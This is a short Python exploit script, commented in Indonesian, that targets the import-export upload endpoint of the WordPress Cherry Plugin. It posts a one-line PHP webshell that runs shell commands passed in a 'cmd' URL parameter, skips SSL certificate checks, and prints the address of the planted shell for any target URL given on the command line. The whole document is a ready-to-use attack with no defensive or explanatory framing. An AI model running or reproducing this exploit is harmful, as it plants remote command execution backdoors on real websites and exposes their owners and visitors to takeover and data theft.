import requests
import sys

def upload_shell(target_url, shell_filename):
    # Endpoint upload Cherry Plugin
    url = f"{target_url}/wp-content/plugins/cherry-plugin/admin/import-export/upload.php"

    # Isi file webshell yang akan diunggah
    webshell_content = "<?php echo shell_exec($_GET['cmd']); ?>"

    # Data form multipart
    files = {
        'file': (shell_filename, webshell_content, 'application/octet-stream')
    }

    try:
        # Mengirimkan request POST
        response = requests.post(url, files=files, verify=False)  # verify=False untuk melewati sertifikat SSL
        
        # Menampilkan hasil request
        if response.status_code == 200:
            shell_url = f"{target_url}/wp-content/plugins/cherry-plugin/admin/import-export/{shell_filename}"
            print(f"[+] Webshell berhasil diunggah!")
            print(f"[+] Akses shell di: {shell_url}")
        else:
            print(f"[-] Upload gagal. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Terjadi kesalahan saat mengirim request: {e}")

# Mengecek parameter baris perintah
if len(sys.argv) != 3:
    print("Penggunaan: python cherry_upload.py <target_url> <shell_filename>")
    sys.exit(1)

# Menangkap parameter dari baris perintah
target_url = sys.argv[1].rstrip("/")
shell_filename = sys.argv[2]

# Memanggil fungsi eksploitasi
upload_shell(target_url, shell_filename)
